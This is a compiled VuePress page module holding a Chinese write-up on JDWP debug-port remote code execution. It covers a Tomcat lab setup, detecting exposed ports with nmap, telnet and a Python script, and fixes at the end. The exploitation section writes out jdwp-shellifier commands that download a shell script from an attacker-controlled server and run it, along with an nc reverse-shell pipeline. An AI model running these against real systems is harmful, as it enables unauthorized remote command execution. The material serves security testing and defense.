import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as l,a as e,b as a,d as s,e as t}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"JDWP（Java Debug Wire Protocol，Java 调试线协议）是一个为 Java 调试而设计的通讯交互协议，它定义了调试器（Debugger）和被调试 JVM（Debuggee）进程之间的交互数据的传递格式，它详细完整地定义了请求命令、回应数据和错误代码，保证了调试端和被调试端之间通信通畅。",-1),u=e("p",null,"JDWP 是 JVM 或者类 JVM 的虚拟机都支持的一种协议，通过该协议，Debugger 端和被调试 JVM 之间进行通信，可以获取被调试 JVM 的包括类、对象、线程等信息。",-1),h=e("p",null,"参考阅读：",-1),v={href:"https://forum.butian.net/share/1232",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><h3 id="windows" tabindex="-1"><a class="header-anchor" href="#windows" aria-hidden="true">#</a> Windows</h3><p>下载 Tomcat 到本地，在 <code>bin\\startup.bat</code> 文件中添加如下代码开启 debug 模式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>点击运行 <code>startup.bat</code> ，以 debug 模式启动 Tomcat。</p><p><code>Listening for transport dt_socket at address: 8000</code>，表示 JDWP 服务已经监听在 8000 端口，等待调试器连接。</p><h3 id="linux" tabindex="-1"><a class="header-anchor" href="#linux" aria-hidden="true">#</a> Linux</h3><p>执行如下命令安装 Tomcat：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 执行wget命令下载Tomcat安装包
wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz

# 解压安装包
tar zxvf apache-tomcat-8.5.43.tar.gz

# 将程序安装包复制到指定运行目录下
sudo mv apache-tomcat-8.5.43 /usr/local/tomcat8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动方式一：</p><p>进入 Tomcat 安装目录下的 bin 目录下找到 <code>catalina.sh</code> 文件，在文件开头部分添加如下一行：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token assign-left variable">CATALINA_OPTS</span><span class="token operator">=</span><span class="token string">&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>修改完成后，执行脚本 <code>./startup.sh</code> 就会以 debug 模式启动 Tomcat。</p><p>启动方式二：</p><p>进入 Tomcat 的 bin 目录，输入 <code>./catalina.sh jpda run</code> 或者 <code>./catalina.sh jpda start</code> 命令以调试模式启动 tomcat。</p><p>启动时就会出现如下信息提示：</p><p><code>Listening for transport dt_socket at address: 8000</code>。</p><p>注意脚本中默认配置 JDWP 是监听在本地的 8000 端口，修改 <code>JDPA_ADDRESS</code> 的值对外开放此端口，在 JDK9 及以上的版本需要修改为 <code>JDPA_ADDRESS=*:8000</code> ，在 JDK9 以下版本修改为 <code>JDPA_ADDRESS=8000</code> 即可</p><h2 id="漏洞检测" tabindex="-1"><a class="header-anchor" href="#漏洞检测" aria-hidden="true">#</a> 漏洞检测</h2><p>有三种常用方式来进行 JDWP 服务探测，原理都是一样的，即向目标端口连接后发送 JDWP-Handshake，如果目标服务直接返回一样的内容则说明是 JDWP 服务。</p><h3 id="nmap" tabindex="-1"><a class="header-anchor" href="#nmap" aria-hidden="true">#</a> Nmap</h3><p>扫描会识别到 JDWP 服务，且有对应的 JDK 版本信息。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.192.1 <span class="token parameter variable">-p</span> <span class="token number">8000</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="telnet" tabindex="-1"><a class="header-anchor" href="#telnet" aria-hidden="true">#</a> Telnet</h3><p>使用 Telnet 命令探测，需要马上输入 JDWP-Handshake，然后服务端返回一样的内容，证明是 JDWP 服务。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>telnet <span class="token number">192.168</span>.182.130 <span class="token number">8000</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>注意：需要马上输入 JDWP-Handshake，并按下回车，不然马上就会断开。在 Linux 系统下使用 telnet 测试可以，在 Windows 系统下使用 telnet 测试不太行。</p><h3 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> Python</h3><p>使用如下脚本扫描，直接连接目标服务器，并向目标发送 JDWP-Handshake，如果能接收到相同内容则说明目标是开启了 JDWP 服务。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import socket

host = &quot;192.168.182.130&quot;
port = 8000
try:
    client = socket.socket()
    client.connect((host, port))
    client.send(b&quot;JDWP-Handshake&quot;)
    if client.recv(1024) == b&quot;JDWP-Handshake&quot;:
        print(&quot;[*] {}:{} Listening JDWP Service! &quot;.format(host, port))
except Exception as e:
    print(&quot;[-] Connection failed! &quot;)
finally:
    client.close()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2><h3 id="poc1" tabindex="-1"><a class="header-anchor" href="#poc1" aria-hidden="true">#</a> POC1</h3>`,32),b={href:"https://github.com/IOActive/jdwp-shellifier",target:"_blank",rel:"noopener noreferrer"},g=t(`<p>jdwp-shellifier 是使用 Python2 编写的，该工具通过编写了一个 JDI（JDWP 客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。</p><p>该漏洞无回显，可利用 dnslog 进行探测：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python2 jdwp-shellifier.py -t 192.168.3.118 -p 8787 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;ping xxx.dnslog.cn&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="反弹-shell" tabindex="-1"><a class="header-anchor" href="#反弹-shell" aria-hidden="true">#</a> 反弹 shell</h4><p>准备反弹 shell 文件，保存为 shell.txt：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc 192.168.178.129 3333 | /bin/bash | nc 192.168.178.129 4444%
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动 http 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 -m http.server 8000
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>开启监听，需要开启 2 个监听，前面一个输入执行命令，后面一个输出命令执行结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -lvvp 3333
nc -lvvp 4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>利用 poc1 执行命令，下载 shell、文件可执行权限、执行 shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;wget http://192.168.178.129:8000/shell.txt -O /tmp/shell.sh&quot;
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;chmod a+x /tmp/shell.sh&quot;
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;/tmp/shell.sh&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>两个监听都收到 shell，一个输入命令，一个输出结果。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230630173638801.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="poc2" tabindex="-1"><a class="header-anchor" href="#poc2" aria-hidden="true">#</a> POC2</h3>`,15),x={href:"https://github.com/Lz1y/jdwp-shellifier",target:"_blank",rel:"noopener noreferrer"},_=e("p",null,"该脚本是在上面一个漏洞利用脚本的基础上，修改利用方式为通过对 Sleeping 的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。",-1),f=e("h2",{id:"修复建议",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#修复建议","aria-hidden":"true"},"#"),a(" 修复建议")],-1),D=e("ul",null,[e("li",null,"关闭 JDWP 端口，或者 JDWP 端口不对公网开放"),e("li",null,"关闭 Java 的 debug 模式")],-1);function J(k,P){const n=d("ExternalLinkIcon");return r(),l("div",null,[c,p,u,h,e("ul",null,[e("li",null,[e("a",v,[a("https://forum.butian.net/share/1232"),s(n)])])]),m,e("p",null,[a("poc1："),e("a",b,[a("https://github.com/IOActive/jdwp-shellifier"),s(n)])]),g,e("p",null,[a("poc2："),e("a",x,[a("https://github.com/Lz1y/jdwp-shellifier"),s(n)])]),_,f,D])}const w=i(o,[["render",J],["__file","JDWP 调试接口 RCE 漏洞.html.vue"]]);export{w as default};
